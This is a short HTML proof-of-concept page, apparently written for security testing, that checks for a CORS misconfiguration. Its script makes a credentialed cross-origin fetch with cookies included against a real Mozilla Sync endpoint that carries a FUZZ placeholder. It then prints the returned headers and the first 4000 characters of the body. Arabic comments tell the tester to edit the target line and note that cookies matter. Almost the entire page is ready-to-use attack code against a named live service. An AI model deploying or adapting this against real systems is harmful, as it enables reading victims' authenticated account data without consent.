<!doctype html>
<html>
  <meta charset="utf-8" />
  <title>PoC CORS</title>
  <body>
    <h3>PoC CORS (attacker-controlled origin)</h3>
    <p id="status">Running...</p>
    <pre id="out" style="white-space:pre-wrap;max-height:60vh;overflow:auto"></pre>

    <script>
      (async () => {
        const out = id => document.getElementById(id);
        try {
          // ====== عدّل السطر ده للـ endpoint اللي أنت تختبره ======
          const target = "https://sync-1-us-west1-g.sync.services.mozilla.com/1.5/271508958/info/collections/FUZZ";
          // ========================================================
          const res = await fetch(target, {
            method: 'GET',
            credentials: 'include' // مهم لو بتختبر مع الكوكيز
          });
          const text = await res.text();
          out('status').innerText = `status: ${res.status}`;
          // show some headers (limited)
          let headers = '';
          for (const pair of res.headers.entries()) {
            headers += pair[0] + ': ' + pair[1] + '\n';
          }
          out('out').innerText =
            `Request URL: ${target}\n\nResponse headers:\n${headers}\n\nBody (first 4000 chars):\n${text.slice(0,4000)}`;
        } catch (e) {
          out('status').innerText = 'error';
          out('out').innerText = e.toString();
        }
      })();
    </script>
  </body>
</html>
